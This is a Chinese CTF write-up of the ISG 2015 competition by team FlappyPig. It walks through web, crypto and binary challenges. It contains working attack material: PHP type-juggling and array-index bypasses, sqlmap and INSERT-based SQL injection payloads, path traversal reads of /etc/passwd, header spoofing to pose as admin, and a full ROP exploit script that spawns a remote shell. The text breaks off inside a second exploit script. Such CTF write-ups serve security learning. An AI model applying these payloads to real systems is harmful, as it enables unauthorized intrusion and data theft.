# ISG2015 FlappyPig Writeup
|
##### 译文声明
本文是翻译文章，文章来源：360安全播报
译文仅供参考，具体内容表达以及含义原文为准。
##  ****
## Misc
### Welcome to ISG 2015 (50)
直接在网页源码中找到,em标签替换为下划线即可。
##
## Web
### collision (50)
那串数字的开头是0e,那么我们只要找到同样0e开头的md5值即可。详见[https://v2ex.com/t/188364](//txfile/)。由于php的特性,这两个进行比较的时候会变成0。
### array (150)
在php版本5.4.0 – 5.4.43, 5.5.0 – 5.5.26, 5.6.0 – 5.6.10,
7.0.0alpha1中数组下标为0x100000000的时候 会和数组下标为0的时候相等
所以构造array.php?user[4294967296]=admin&user[1]=1445132760
后面的时间戳向后设置10秒左右,一直刷新就可以出flag了.
## webdroid (200)
把apk反编译之后可以看到一段代码:
    new DefaultHttpClient();
    HttpPost localHttpPost = new HttpPost("http://202.120.7.135:8888/html/api.php");
    JSONObject localJSONObject = new JSONObject();
    localJSONObject.put("secret", paramString);
    localHttpPost.setEntity(new StringEntity(localJSONObject.toString()));
    String str = EntityUtils.toString(new DefaultHttpClient().execute(localHttpPost).getEntity());
    return str;
大概意思是将JSON数据{"secret":paramString}POST到那个链接
直接用burp发包修改Content-Type提交数据{"secret":0}
解码失败后是null
服务端估计又是用的弱类型判断 null==0
拿到flag
### Fruit Store (200)
GBK注入 直接扔到sqlmap里就能跑
    sqlmap -u "
    http://202.120.7.140:8888/try.php?fruit=flag%df*"
跑出来之后数据库是store表是tell_me_who_u_are –dump一下就出flag了
### Image Database (200)
提交../../../../../../../etc/passwd可以读到用户主目录是/home/isg
提交../../../../../../../home/isg/.bash_history可以知道/home/isg/web目录下有main.py
直接读读不了所以读main.pyc
反编译字节码之后在代码里看到flag在secret/flag.txt也是不能直接读
看代码之后发现有get_image get_text secret_protect三个主要函数
get_image会将用户提交的数据base64加密后传给secret_protect
get_text会将用户提交的数据直接传给secret_protect
所以通过get_text可以直接绕过secret_protect的限制
get_text绑定的路由是/gettext_underbuilding
所以POST提交的时候用burp拦截下来把/getimg改成/gettext_underbuilding就可以获取flag了
### shell (250)
能上传文件,文件名是 用户名.随机序列所以考虑注册一个.php结尾的用户
直接注册不了带非数字和非字母的用户名,检测之后发现邮箱的位置有注入所以想到在注册的时候直接额外添加一个.php结尾的用户
根据Web 350 Injection那道题的源码猜测本题的SQL插入语句也是
    $sql = "INSERT INTO users(username, password, email, ip) VALUES ('$username', '$password', '$email', '$ip')";
这种形式
所以构造payload:
    username=asdasd5cacc&password=asdasdaccc&email=PI:EMAIL','127.0.0.1'),('sbsun.php','f5de0b92fcff5f1fa67c503c04008278','PI:EMAIL','127.0.0.1') %23
形成
$sql = "INSERT INTO users ( username , password , email , ip) VALUES (
'asdasd5cacc' ,
'asdasdaccc','PI:EMAIL','127.0.0.1'),('sbsun.php','f5de0b92fcff5f1fa67c503c04008278','PI:EMAIL','127.0.0.1')
# ','$ip')";
来同时插入两个用户
然后用新注册的用户登录后上传文件并访问即可拿到flag.
### SuperAdmin (250)
估计是注册的时候没有把用户名trim而登录时验证的是用户名trim后是否等于"admin"
所以注册的时候用户名注册为类似admin%20%0a这种,登录之后会被认为是admin登陆
登陆之后提示"你不是本机用户,不能看到调试信息"
登陆的时候把XFF头改成127.0.0.1就好了
看到一部分源码,源码具体内容没保存,忘了,就记得主要的是调用一个register函数,前几个参数是用户名,密码,IP,最后一个参数是$is_super
考虑可能存在变量覆盖漏洞
所以再注册一次用户并在url加上参数is_super=1然后注册登陆后即可看到flag
### injection (350)
根据index.php.bak审计源码,
发现可能存在二次注入
search的时候用户名是从session中读取的,
session中的用户信息是在登陆或注册的时候存进去的,
fuzz了一下,发现可能存在内容截断,用户名在数据库中设置的长度是64
提交注册数据
username=lingaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaacd&password=asd&email=asd%40qq.com
带入到$sql之后可以造成单引号逃逸,使得$title可以直接注入
$sql = "select * from posts where
username='lingaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaacd' and
title like '$title'";
登陆后可以直接用search=xxx进行手注也可以带着登陆后的cookie扔到sqlmap里跑,然后就能出flag了
## Crypto
### RSA (100)
从使用openssl从pem文件中提取e,n,n为256bit,上rsatools直接破:
然后利用n求得d后直接解密enc文件即可:
    __author__ = 'bibi'
    n=0xA41006DEFD378B7395B4E2EB1EC9BF56A61CD9C3B5A0A73528521EEB2FB817A7
    e=65537
    p=0xD7DB8F68BCEC6D7684B37201385D298B
    q=0xC292A272E8339B145D9DF674B9A875D5
    d=0x330228A0BBE9C119B6B9FEB34B673E6D9AAC3AD81409694B576871521254A2C1
    r=open("flag.enc","rb")
    re=r.read()
    print re.encode("hex")
    m=0x49b96edbe3961f58d529074bd893d6e036ceaf2b6d214b470fdc0d48723d6a40
    c=pow(m,d,n)
    print c
    print(('0'+hex(c)[2:][:-1]).decode("hex"))  
### Alice(200)
通过交互得知Alice在和Bob使用共享密钥算法Diffie-Hellman,这个题目本身并没有难点,主要是能够成功和Alice交互密钥即可。首先Alice向Bob提供了素数p和原根g,然后Alice自己产生了自己的私钥,并计算出公钥即key发送给Bob。我们作为Bob的模拟方,首先自己随便取一个私钥,然后根据素数p和原根g计算出公钥,发送给Alice,并通过Alice的公钥和我们的私钥计算出共享密钥K。Alice之后发送过来的密文即可以用K异或解密了。和Alice进行脑洞的对话后获取flag。注意密钥的长度不够,在flag传过来的时候,密钥倍长了一次。
    __author__ = 'bibi'
     from zio import *
     import time
     def convert_int(s):
         rs=s[::-1]
         r=0
         for i in rs:
             r=(r<<8)|(ord(i))
         return r
     def tentostr(k):
         temp=hex(k)
         t=str(temp)
         if t[-1]=='l' or t[-1]=='L':
             t=t[0:-1]
         r=t[2:]
         l=len(r)
         if l % 2 == 1:
             r='0'+r
         return r.decode("hex")
     def crypt(c,key):
         miyao=tentostr(key)
         miyao=miyao+miyao
         result=""
         for i in range(len(c)):
             result=result+chr(ord(c[i])^ord(miyao[i]))
         return result
     io=zio(("202.120.7.153",10002))
     text=io.read_until("Bob: KEY =")
     p=7434819441271677988772806904156413576519364203006754273683435665142647787269043488641
     g=3
     agkey=int(text.split("KEY = ")[1].split("n")[0])
     bskey=123
     bgkey=pow(g,bskey,p)
     io.write(str(bgkey))
     K=pow(agkey,bskey,p)
     next=io.read_until("nBob: ")
     text=next.split("Alice: ")[1].split("n")[0].decode("base64")
     #print "################"+crypt(text,K)
     io.write(crypt("Alice",K).encode("base64"))
     text2=io.read_until("n")
     time.sleep(1)
     m2=text2.split("e: ")[1].split("n")[0].decode("base64")
     print crypt(m2,K)
     io.interact()  
---  
##
## Exploit
### pwnme (100)
逻辑非常简单:
覆盖返回地址后,构造rop即可拿到shell,代码如下:
    __author__ = "pxx"
    from zio import *
    import struct
    target = ("202.120.7.145", 9991)#"./pwnme"
    def get_io(target):
             io = zio(target, timeout = 9999)
             return io
    def full_buff(cur_data, length, ch_t = 'a'):
             len_t = length - len(cur_data)
             return cur_data + ch_t * len_t
    def pwn(io):
             io.read_until("the flag:n")
             io.gdb_hint()
             data = full_buff("a", 16)
             print "data len:", len(data)
             write_plt_addr = l32(0x08048370)
             read_plt_addr = l32(0x08048330)
             read_got_addr = 0x0804a00c
             write_got_addr = 0x0804a01c
             ebp_str = l32(0x01010101)
             p_ret = l32(0x08048311)
             pp_ret = l32(0x0804853e)
             ppp_ret = l32(0x0804853d)
             shellcode = write_plt_addr + ppp_ret + l32(0x1) + l32(write_got_addr) + l32(0x4)
             shellcode += read_plt_addr + ppp_ret + l32(0x0) + l32(write_got_addr) + l32(0x4)
             shellcode += read_plt_addr + ppp_ret + l32(0x0) + l32(read_got_addr) + l32(0x9)
             shellcode += write_plt_addr + p_ret + l32(read_got_addr)
             payload = data + ebp_str + shellcode
             io.write(payload + 'n')
             data = io.read(0x4)
             print len(data)
             write_real_addr = l32(data)
             print hex(write_real_addr)
             libc_addr = write_real_addr - 0x000dac50
             system_real_addr = libc_addr + 0x00040190
             binstr_real_addr = libc_addr + 0x160a24
             io.write(l32(system_real_addr))
             io.write("/bin/sh;n")
             io.interact()
    io = get_io(target)
    pwn(io)
flag如下:
### echo (200)
逻辑非常简单:
属于格式化字符串漏洞,泄露地址后,用system将fgets的got表覆盖就可以拿到shell,开启了pie,泄露时还需要计算好got表的地址:
由于没有提供libc,直接与前面给出的地址作比较,猜想就是同一个libc,代码如下:
    __author__ = "pxx"
    from zio import *
    import struct
    target = ("202.120.7.152", 9995)
    #target = "./echo"
    def get_io(target):
             io = zio(target, timeout = 9999)
             return io
    def full_buff(cur_data, length, ch_t = 'a'):